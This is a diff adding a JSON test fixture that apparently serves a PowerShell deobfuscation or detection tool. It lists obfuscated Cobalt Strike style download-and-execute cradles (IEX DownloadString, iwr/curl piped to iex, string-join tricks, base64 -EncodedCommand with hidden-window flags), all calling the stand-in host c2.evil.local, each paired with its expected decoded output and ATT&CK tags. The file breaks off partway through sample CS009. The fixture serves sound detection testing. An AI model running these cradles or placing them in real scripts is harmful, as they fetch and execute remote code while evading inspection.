@@ -1,0 +1,1689 @@
+{
+  "family_id": "cobalt_strike",
+  "family_display_name": "Cobalt Strike",
+  "family_version": "r1-2.0.0",
+  "schema_version": "technique-first-1.0.0",
+  "description": "Cobalt Strike (Empire / Nishang / Invoke-CradleCrafter lineage) beacon staging, download cradles, base64-EncodedCommand wrappers, CMD\u2192PowerShell handoff patterns, and layered obfuscation variants. Curated deterministic Phase R1 pack (technique-first taxonomy).",
+  "primary_mitre_attack": [
+    "T1059.001",
+    "T1105",
+    "T1027.010",
+    "T1140"
+  ],
+  "primary_behaviors": [
+    "download_and_execute",
+    "remote_code_execution",
+    "obfuscated_command_line",
+    "beacon_staging"
+  ],
+  "known_technique_universe": [
+    "backtick_alias_obfuscation",
+    "beacon_jitter_numeric_fold",
+    "cmd_caret_powershell_handoff",
+    "curl_alias_useb_iex",
+    "env_var_reconstruction",
+    "frombase64string_shellcode_staging",
+    "iex_downloadstring_cradle",
+    "iwr_useb_iex_pipeline",
+    "join_operator_reconstruction",
+    "nested_multi_layer_encoding",
+    "powershell_encodedcommand_base64_utf16le",
+    "static_string_join_reconstruction",
+    "string_concat_url_obfuscation",
+    "string_index_slice_reconstruction"
+  ],
+  "techniques": [
+    {
+      "id": "iex_downloadstring_cradle",
+      "display_name": "IEX DownloadString Cradle",
+      "description": "Classic Empire/Nishang lineage: `IEX ((New-Object Net.WebClient).DownloadString($url))` payload delivery.",
+      "mitre_attack": [
+        "T1059.001",
+        "T1105"
+      ],
+      "samples": [
+        {
+          "id": "CS001",
+          "variant": "iex_downloadstring_classic",
+          "input": "IEX((New-Object Net.WebClient).DownloadString(\"http://c2.evil.local/beacon.ps1\"))",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "New-Object Net.WebClient",
+              "DownloadString",
+              "http://c2.evil.local/beacon.ps1"
+            ],
+            "iocs_contains": [
+              "http://c2.evil.local/beacon.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105"
+            ],
+            "behaviors": [
+              "download_and_execute",
+              "remote_code_execution"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "8c89ccb2c48ab05db7c6d4366bace1f690ed15b1c00c6b272c545b4127dc7964",
+              "certificate_fingerprint": "4e603e995fe78bf011356a82a58fabb837f2ffd82e41c6eb250b22fed1187321",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:22:31+00:00"
+            },
+            "capabilities": [
+              "download_cradle",
+              "beacon_c2"
+            ]
+          }
+        },
+        {
+          "id": "CS002",
+          "variant": "iex_downloadstring_lowercase",
+          "input": "iex((new-object net.webclient).downloadstring(\"http://c2.evil.local/stage2\"))",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://c2.evil.local/stage2"
+            ],
+            "iocs_contains": [
+              "http://c2.evil.local/stage2"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105"
+            ],
+            "behaviors": [
+              "download_and_execute"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "f347f825660639841a9ce009d469c82eaec6fee50ac51175b29326dabbd54994",
+              "certificate_fingerprint": "d67611d87bf9baa11310969ae28023280592251c9b820d3348743367d05fdfc6",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:22:31+00:00"
+            },
+            "capabilities": [
+              "download_cradle",
+              "beacon_c2"
+            ]
+          }
+        },
+        {
+          "id": "CS019",
+          "variant": "sq_var_propagate_iex",
+          "input": "$u='http://c2.evil.local/final'; iex ((new-object net.webclient).downloadstring($u))",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "variable-propagate",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://c2.evil.local/final"
+            ],
+            "iocs_contains": [
+              "http://c2.evil.local/final"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105"
+            ],
+            "behaviors": [
+              "download_and_execute"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "b14e3cb40adca30cddee7b8477dfd8d6301be6bab39cf1eee70a48bdf6c30aee",
+              "certificate_fingerprint": "024ba09616a807eef9b306b1e29b00df4fb674d44208ffbf65c2e7b56b30229a",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:22:31+00:00"
+            },
+            "capabilities": [
+              "variable_propagation_obfuscation",
+              "download_cradle"
+            ]
+          }
+        },
+        {
+          "id": "CS026",
+          "variant": "random_case_iex_downloadstring",
+          "input": "iEx ((nEw-oBjecT nEt.WebClIent).DoWnLoAdStrIng('http://c2.evil.local/casey'))",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://c2.evil.local/casey"
+            ],
+            "iocs_contains": [
+              "http://c2.evil.local/casey"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027.010"
+            ],
+            "behaviors": [
+              "case_obfuscation",
+              "download_and_execute"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "989333a49bb621ae55689ec5840bd86ce8b84a20063be36333cd8e635cca653f",
+              "certificate_fingerprint": "4888b8122326ee35041efa8f5368c3b60b1f01872a2f4ab0b372ad8610f90089",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:22:31+00:00"
+            },
+            "capabilities": [
+              "case_obfuscation",
+              "download_cradle"
+            ]
+          }
+        },
+        {
+          "id": "CS030",
+          "variant": "iex_downloadstring_https_loader_ps1",
+          "input": "IEX ((New-Object Net.WebClient).DownloadString('https://c2.evil.local/cs30/loader.ps1'))",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "https://c2.evil.local/cs30/loader.ps1"
+            ],
+            "iocs_contains": [
+              "https://c2.evil.local/cs30/loader.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105"
+            ],
+            "behaviors": [
+              "download_and_execute"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "8bd42d6bad28b2d24ac258239e0517b662d566552f5a1c079c8b4689eb6d269e",
+              "certificate_fingerprint": "29ef24511219312e68f875755c338bcc99fb16917cf6a2f2d2fa4d99115122d6",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:22:31+00:00"
+            },
+            "capabilities": [
+              "download_cradle",
+              "beacon_c2"
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "id": "join_operator_reconstruction",
+      "display_name": "PowerShell -join Array Reconstruction",
+      "description": "Invoke-CradleCrafter Cradle 5 / TokenLevel 4 output: URL or cmdlet name split into a PS array and rejoined with `-join ''` at call time.",
+      "mitre_attack": [
+        "T1059.001",
+        "T1105",
+        "T1027.010"
+      ],
+      "samples": [
+        {
+          "id": "CS031",
+          "variant": "join_operator_url_reconstruct",
+          "input": "iex ((new-object net.webclient).downloadstring(('http','://','c2.evil.local','/join_op','.ps1') -join ''))",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "structural-join-operator-fold",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://c2.evil.local/join_op.ps1"
+            ],
+            "iocs_contains": [
+              "http://c2.evil.local/join_op.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027.010"
+            ],
+            "behaviors": [
+              "download_and_execute",
+              "obfuscated_command_line"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "b04e6707450d2845cd9732f1a7b0834c4d10e5998c0a2c5f7e52e6f6790caf4c",
+              "certificate_fingerprint": "497f52b054bf4c8659c54098e4a7b0b3e38a4b05a4bb35f948d849ae72ecb9d2",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:22:31+00:00"
+            },
+            "capabilities": [
+              "join_array_reconstruction",
+              "download_cradle"
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "id": "static_string_join_reconstruction",
+      "display_name": "[String]::Join Cmdlet/URL Reconstruction",
+      "description": "Nishang / Invoke-Encode reconstruction of URL or cmdlet names via `[String]::Join('', @('h','t','t','p'...))`.",
+      "mitre_attack": [
+        "T1059.001",
+        "T1105",
+        "T1027.010"
+      ],
+      "samples": [
+        {
+          "id": "CS032",
+          "variant": "static_string_join_reconstruct",
+          "input": "iex ((new-object net.webclient).downloadstring([String]::Join('', ('h','t','t','p','s',':','/','/','c','2','.','e','v','i','l','.','l','o','c','a','l','/','s','j','.','p','s','1'))))",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "structural-static-join-fold",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "https://c2.evil.local/sj.ps1"
+            ],
+            "iocs_contains": [
+              "https://c2.evil.local/sj.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027.010"
+            ],
+            "behaviors": [
+              "download_and_execute",
+              "obfuscated_command_line"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "1ae3509934099ef10ec0f5715c23435e3d58513f5683a501ae1e03e544b5be58",
+              "certificate_fingerprint": "9745a256b19f9e54ffc94d766de1d577cafc1f93f77085b50418890b5636335d",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:22:31+00:00"
+            },
+            "capabilities": [
+              "join_array_reconstruction",
+              "download_cradle"
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "id": "string_index_slice_reconstruction",
+      "display_name": "String-Index Slice Alphabet Reconstruction",
+      "description": "Empire Set-EncodedString: fixed alphabet indexed with `[a..b]` ranges + `[a,b,c]` lists to reconstruct cmdlets and URLs.",
+      "mitre_attack": [
+        "T1059.001",
+        "T1027.010",
+        "T1140"
+      ],
+      "samples": [
+        {
+          "id": "CS033",
+          "variant": "string_index_range_slice_reconstruct",
+          "input": "$abc='abcdefghijklmnopqrstuvwxyz'; iex ((new-object net.webclient).downloadstring('http://c2.evil.local/'+[String]::Join('', $abc[7..10])+'.ps1'))",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "content-string-index-range-fold",
+              "structural-static-join-fold",
+              "structural-string-concat-fold",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://c2.evil.local/hijk.ps1"
+            ],
+            "iocs_contains": [
+              "http://c2.evil.local/hijk.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027.010",
+              "T1140"
+            ],
+            "behaviors": [
+              "download_and_execute",
+              "obfuscated_command_line"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "d5fef088396f82434958f3d2be8a9705663570ad094d3cb310add4edd6a9939b",
+              "certificate_fingerprint": "f912fc9c9b2723995c30504010dc207246d367c29b46dbaec53fdaf323f2b7fd",
+              "expected_iterations": 5,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:22:31+00:00"
+            },
+            "capabilities": [
+              "string_index_slice",
+              "join_array_reconstruction",
+              "download_cradle"
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "id": "beacon_jitter_numeric_fold",
+      "display_name": "Beacon Jitter Numeric Obfuscation",
+      "description": "Cobalt Strike Malleable-C2 sleep-with-jitter: `Start-Sleep -Seconds (30+30)` to hinder static timing analysis.",
+      "mitre_attack": [
+        "T1059.001",
+        "T1027.010",
+        "T1497.003"
+      ],
+      "samples": [
+        {
+          "id": "CS034",
+          "variant": "numeric_constant_fold_sleep_jitter",
+          "input": "Start-Sleep -Seconds (30+30); iex ((new-object net.webclient).downloadstring('http://c2.evil.local/jitter.ps1'))",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "content-numeric-constant-fold",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Start-Sleep",
+              "60",
+              "Invoke-Expression",
+              "http://c2.evil.local/jitter.ps1"
+            ],
+            "iocs_contains": [
+              "http://c2.evil.local/jitter.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027.010",
+              "T1497.003"
+            ],
+            "behaviors": [
+              "download_and_execute",
+              "obfuscated_command_line",
+              "time_based_evasion"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "267ec80b1ca00fa2abcff708c19d560aeecbe68e14d80a68371289ac04364b19",
+              "certificate_fingerprint": "d69f31e71a8b649ce6d354b7e7e0241f67553210dc438ec55cbbac93a02fa0b5",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:22:31+00:00"
+            },
+            "capabilities": [
+              "numeric_constant_folding_obf",
+              "time_based_evasion",
+              "download_cradle"
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "id": "frombase64string_shellcode_staging",
+      "display_name": "[Convert]::FromBase64String Shellcode Staging",
+      "description": "Public Cobalt Strike beacon staging pattern: `$sc = [Convert]::FromBase64String('...'); IEX $sc`.",
+      "mitre_attack": [
+        "T1059.001",
+        "T1105",
+        "T1027",
+        "T1140"
+      ],
+      "samples": [
+        {
+          "id": "CS035",
+          "variant": "frombase64string_shellcode_staging",
+          "input": "$sc = [Convert]::FromBase64String('cG93ZXJzaGVsbCAtQ29tbWFuZCBJRVgoKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9jMi5ldmlsLmxvY2FsL3N0YWdlZC5wczEnKSk='); IEX $sc",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "decoder-frombase64string-fold",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://c2.evil.local/staged.ps1"
+            ],
+            "iocs_contains": [
+              "http://c2.evil.local/staged.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027",
+              "T1140"
+            ],
+            "behaviors": [
+              "download_and_execute",
+              "shellcode_staging",
+              "obfuscated_command_line"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "c21c052745d3f15e0221b5f56f800eb88c2d4f70774c4284ad1d5575117bbaa6",
+              "certificate_fingerprint": "be8d7b9c5d57d8d319bb0cf82946696d9a84c7b27fc9a7c9f962895647d916e0",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:22:31+00:00"
+            },
+            "capabilities": [
+              "shellcode_staging",
+              "variable_propagation_obfuscation"
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "id": "iwr_useb_iex_pipeline",
+      "display_name": "IWR + UseBasicParsing | IEX Pipeline",
+      "description": "`Invoke-WebRequest -UseBasicParsing | Invoke-Expression` fetch-and-execute pipeline (with alias `iwr`).",
+      "mitre_attack": [
+        "T1059.001",
+        "T1105"
+      ],
+      "samples": [
+        {
+          "id": "CS003",
+          "variant": "iwr_useb_iex_pipeline",
+          "input": "iwr 'http://c2.evil.local/loader' -useb | iex",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-WebRequest",
+              "http://c2.evil.local/loader",
+              "Invoke-Expression"
+            ],
+            "iocs_contains": [
+              "http://c2.evil.local/loader"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105"
+            ],
+            "behaviors": [
+              "download_and_execute"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "e4b089ea6ad3104a3c2fdb445ce7743188f8c2e4229c49ae33d01d1d9d89b99d",
+              "certificate_fingerprint": "3bebe8fdf4c757684d4527f3b9a57098c6776bc7dbd00f57cdf096d428789d94",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:22:31+00:00"
+            },
+            "capabilities": [
+              "iwr_pipeline_download",
+              "beacon_c2"
+            ]
+          }
+        },
+        {
+          "id": "CS013",
+          "variant": "iwr_https_useb_iex",
+          "input": "iwr https://c2.evil.local/loader -UseBasicParsing | iex",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-WebRequest",
+              "https://c2.evil.local/loader",
+              "Invoke-Expression"
+            ],
+            "iocs_contains": [
+              "https://c2.evil.local/loader"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105"
+            ],
+            "behaviors": [
+              "download_and_execute"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "5c7d670eaec71644de4ec033f3e4b80e1c538efc6164d3d654ec98413c29a4bc",
+              "certificate_fingerprint": "601c4c3cfbb5eda78734c98a0d039dbbbe36d38d3aeccecf3dae499cfa3c1ff1",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:22:31+00:00"
+            },
+            "capabilities": [
+              "iwr_pipeline_download",
+              "beacon_c2"
+            ]
+          }
+        },
+        {
+          "id": "CS015",
+          "variant": "split_scheme_iwr_useb_iex",
+          "input": "$s='ht'+'tps://c2.evil.local/split_scheme'; iwr $s -useb | iex",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "string-concat-fold",
+              "variable-propagate",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-WebRequest",
+              "https://c2.evil.local/split_scheme",
+              "Invoke-Expression"
+            ],
+            "iocs_contains": [
+              "https://c2.evil.local/split_scheme"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027.010"
+            ],
+            "behaviors": [
+              "download_and_execute",
+              "obfuscated_command_line"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "977c5e63bc7d07b5dc56a0a80a446ad57e94a0da5848bd6fd87cc9242af28499",
+              "certificate_fingerprint": "900416dfc28304bc4be30b1d6d3eb023753855335e1c89dc6a94d5535d4ddcdd",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:22:31+00:00"
+            },
+            "capabilities": [
+              "string_concat_obfuscation",
+              "variable_propagation_obfuscation",
+              "iwr_pipeline_download"
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "id": "curl_alias_useb_iex",
+      "display_name": "curl Alias | IEX",
+      "description": "`curl` used as a PowerShell alias for Invoke-WebRequest, chained to `iex`.",
+      "mitre_attack": [
+        "T1059.001",
+        "T1105"
+      ],
+      "samples": [
+        {
+          "id": "CS014",
+          "variant": "curl_alias_useb_iex",
+          "input": "curl 'http://c2.evil.local/first' -UseBasicParsing | iex",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "curl",
+              "http://c2.evil.local/first",
+              "Invoke-Expression"
+            ],
+            "iocs_contains": [
+              "http://c2.evil.local/first"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105"
+            ],
+            "behaviors": [
+              "download_and_execute"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "2287dc721cd3c29808102e4d6f8753c5caa36ee48b5d34b33b5eb816fbcfa2ff",
+              "certificate_fingerprint": "525a74fb26cbd69900a1ad0f6a693a9cde633becaf45b43291579544684bb54e",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:22:31+00:00"
+            },
+            "capabilities": [
+              "curl_alias_download",
+              "beacon_c2"
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "id": "string_concat_url_obfuscation",
+      "display_name": "String-Concat URL Obfuscation",
+      "description": "URL broken into 2-4 single-quoted concat fragments and reassembled via variable propagation before download.",
+      "mitre_attack": [
+        "T1059.001",
+        "T1105",
+        "T1027.010"
+      ],
+      "samples": [
+        {
+          "id": "CS004",
+          "variant": "string_concat_url_scheme_split",
+          "input": "$W='ht'+'tp'+'s'; $C='://'; $H='c2.evil.local/beacon.js'; iex((new-object net.webclient).downloadstring($W+$C+$H))",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "string-concat-fold",
+              "variable-propagate",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "https://c2.evil.local/beacon.js"
+            ],
+            "iocs_contains": [
+              "https://c2.evil.local/beacon.js"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027.010"
+            ],
+            "behaviors": [
+              "download_and_execute",
+              "obfuscated_command_line"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "64554a92563192ab120708d59b3399b4f3644840464f72f19880421df11e6e98",
+              "certificate_fingerprint": "5ba10416bd32b804f9afff80dabca9f667eb376b87d83a83fab609a23ba50c33",
+              "expected_iterations": 4,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:22:31+00:00"
+            },
+            "capabilities": [
+              "string_concat_obfuscation",
+              "variable_propagation_obfuscation",
+              "download_cradle"
+            ]
+          }
+        },
+        {
+          "id": "CS005",
+          "variant": "string_concat_two_var",
+          "input": "$scheme='http'+'s://'; $host2='c2.evil.local/x'; iex((new-object net.webclient).downloadstring($scheme+$host2))",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "string-concat-fold",
+              "variable-propagate",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "https://c2.evil.local/x"
+            ],
+            "iocs_contains": [
+              "https://c2.evil.local/x"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027.010"
+            ],
+            "behaviors": [
+              "download_and_execute",
+              "obfuscated_command_line"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "55b7935d83e7dd144e552632f4f74fb0064d58b1c66a9185c2accf67788157f4",
+              "certificate_fingerprint": "071f505e21a9bc752c327817555c46bc1d6ebb43989fe1a19ec872ac39e412db",
+              "expected_iterations": 3,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:22:31+00:00"
+            },
+            "capabilities": [
+              "string_concat_obfuscation",
+              "variable_propagation_obfuscation",
+              "download_cradle"
+            ]
+          }
+        },
+        {
+          "id": "CS006",
+          "variant": "string_concat_full_url",
+          "input": "$u='http'+'://'+'c2.evil.local/'+'stage3'; iex ((new-object net.webclient).downloadstring($u))",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "string-concat-fold",
+              "variable-propagate",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://c2.evil.local/stage3"
+            ],
+            "iocs_contains": [
+              "http://c2.evil.local/stage3"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027.010"
+            ],
+            "behaviors": [
+              "download_and_execute",
+              "obfuscated_command_line"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "34820a9f97d996690393ac9e4d00579520f46d5175ddd7b4abacc4f7fd970a3b",
+              "certificate_fingerprint": "846eb770ea8423c0baba3ff480779f0dbc6f238d4aaf7960d2cb8ecb7ea3f093",
+              "expected_iterations": 3,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:22:31+00:00"
+            },
+            "capabilities": [
+              "string_concat_obfuscation",
+              "variable_propagation_obfuscation",
+              "download_cradle"
+            ]
+          }
+        },
+        {
+          "id": "CS020",
+          "variant": "three_var_concat_chain",
+          "input": "$A='ht'; $B='tp://'; $C='c2.evil.local/three'; iex ((new-object net.webclient).downloadstring($A+$B+$C))",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "variable-propagate",
+              "string-concat-fold",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://c2.evil.local/three"
+            ],
+            "iocs_contains": [
+              "http://c2.evil.local/three"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027.010"
+            ],
+            "behaviors": [
+              "download_and_execute",
+              "obfuscated_command_line"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "b1f0b762c04d4766d1e3c8b71e5545fe67c723ebfaba9e1a04a7344891574bd6",
+              "certificate_fingerprint": "409c218a783031994e5ae14226325a5c372c4028c197ba7dd0196a9d693cba31",
+              "expected_iterations": 4,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:22:31+00:00"
+            },
+            "capabilities": [
+              "variable_propagation_obfuscation",
+              "string_concat_obfuscation",
+              "download_cradle"
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "id": "powershell_encodedcommand_base64_utf16le",
+      "display_name": "PowerShell -EncodedCommand (Base64/UTF-16LE)",
+      "description": "Base64-encoded UTF-16LE script delivered via `-EncodedCommand` / `-Enc` / `-enc` (with optional -NoP -NonI -W Hidden flags).",
+      "mitre_attack": [
+        "T1059.001",
+        "T1027",
+        "T1140"
+      ],
+      "samples": [
+        {
+          "id": "CS007",
+          "variant": "powershell_encodedcommand_iex_cradle",
+          "input": "powershell -EncodedCommand SQBFAFgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAuAGwAbwBjAGEAbAAvAGIAZQBhAGMAbwBuAC4AcABzADEAJwApACkA",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "powershell-encoded-command",
+              "base64",
+              "utf-16le-decode",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://c2.evil.local/beacon.ps1"
+            ],
+            "iocs_contains": [
+              "http://c2.evil.local/beacon.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027",
+              "T1140"
+            ],
+            "behaviors": [
+              "download_and_execute",
+              "obfuscated_command_line"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "643dd63ef655184779f703a5512fa1912e14e94a01dc3fdb52312f775fb7e5d2",
+              "certificate_fingerprint": "6c08a2ec5dc124921d0d40cdd953d4e1d4c185d02e4f8b7984d7e81ad4e47d01",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:22:31+00:00"
+            },
+            "capabilities": [
+              "encoded_command",
+              "download_cradle"
+            ]
+          }
+        },
+        {
+          "id": "CS008",
+          "variant": "powershell_enc_short_writehost",
+          "input": "powershell -enc VwByAGkAdABlAC0ASABvAHMAdAAgACIAQwBvAGIAYQBsAHQAIABTAHQAcgBpAGsAZQAgAGIAZQBhAGMAbwBuACAAcwB0AGEAZwBlAGQAIgA=",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "powershell-encoded-command",
+              "base64",
+              "utf-16le-decode"
+            ],
+            "final_output_contains": [
+              "Write-Host",
+              "Cobalt Strike beacon staged"
+            ],
+            "iocs_contains": [],
+            "mitre_attack": [
+              "T1059.001",
+              "T1027"
+            ],
+            "behaviors": [
+              "obfuscated_command_line"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "6cb3612217add6abca8653df4d80af7a9163cf983b6ce1c1b3c95c5399def236",
+              "certificate_fingerprint": "04ae89e3c56eb5c25290698261526bab78b56e8403e876523f8c275845c26769",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:22:31+00:00"
+            },
+            "capabilities": [
+              "encoded_command"
+            ]
+          }
+        },
+        {
+          "id": "CS009",
+          "variant": "ps_nop_noni_wh_enc_flags",
+          "input": "powershell -NoP -NonI -W Hidden -Enc SQBFAFgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAuAGwAbwBjAGEAbAAvAHQAaQBuAHkAYgBlAGEAYwBvAG4AJwApACkA",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
